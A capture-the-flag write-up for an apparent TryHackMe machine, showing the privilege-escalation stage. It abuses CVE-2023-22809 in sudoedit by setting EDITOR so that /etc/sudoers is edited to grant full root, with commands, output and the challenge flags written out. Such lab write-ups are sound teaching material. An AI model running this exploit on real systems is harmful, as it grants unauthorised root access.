A challenge inspired by the Mr. Robot movie. After fuzzing for subdomains, we find a login-panel and can elevate privileges through an IDOR vulnerability, solving part of the challenge on the way. After gaining a foothold through SSTI, we escalate to root on the Box through a CVE involving an old version of the `sudoedit` binary.

## Escalating to root

First, I stabilized my shell as per usual, with `python3 -c 'import pty;pty.spawn("/bin/bash")'`, backgrounding the shell etc. The `user.txt` flag was located right there:

```console
web@cyprusbank:~/app$ cat ../user.txt 
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```

For PrivEsc, I first tried `sudo -l`, which showed the `web` user could, in fact, run a specific command as root:

```console
web@cyprusbank:~/app$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

However, it was not clear to me how to abuse this editing-ability as root, since the file was only a config-file for the web-service:

```console
web@cyprusbank:~/app$ cat /etc/nginx/sites-available/admin.cyprusbank.thm
server {
  listen 80;
    
  server_name admin.cyprusbank.thm;
    
  location / {
    proxy_pass http://localhost:8080;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection 'upgrade';
    proxy_set_header Host $host;
    proxy_cache_bypass $http_upgrade;
  }
}
```

Looking around the file system, I could not find anything remarkable. Before just mindlessly running LinPEAS, I used a hint, which was to look for CVEs involving `sudoedit` itself. I found [this PDF](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf) on CVE-2023-22809, which states that there is a bug in the way in which user-provided environment variables are processed by `sudoedit`, thus leading to arbitrary file-write as `root`. This CVE applies for versions 1.8.0 through 1.9.12p1. Indeed, I checked, and it seems that we can use this CVE:

```console
web@cyprusbank:~/app$ sudoedit -V
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
```

The exploit works as follows: first, export an `EDITOR` environment variable, namely `export EDITOR="vim -- /etc/sudoers"`. Next, run the privileged command, i.e. `sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm`. This will open the `sudoers` file in vim, and we can write to it! Replace the line 

```
web ALL=(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

with 

```
web ALL=(root) NOPASSWD: ALL
```

Now, simply with to root with `sudo su`.

```console
web@cyprusbank:~/app$ export EDITOR="vim -- /etc/sudoers"
web@cyprusbank:~/app$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
sudo: sudoedit doesn't need to be run via sudo
sudo: --: editing files in a writable directory is not permitted
2 files to edit
sudo: /etc/nginx/sites-available/admin.cyprusbank.thm unchanged
web@cyprusbank:~/app$ sudo su
root@cyprusbank:/home/web/app# cat /root/root.txt 
THM{4nd_uR_p4ck4g3s}
```
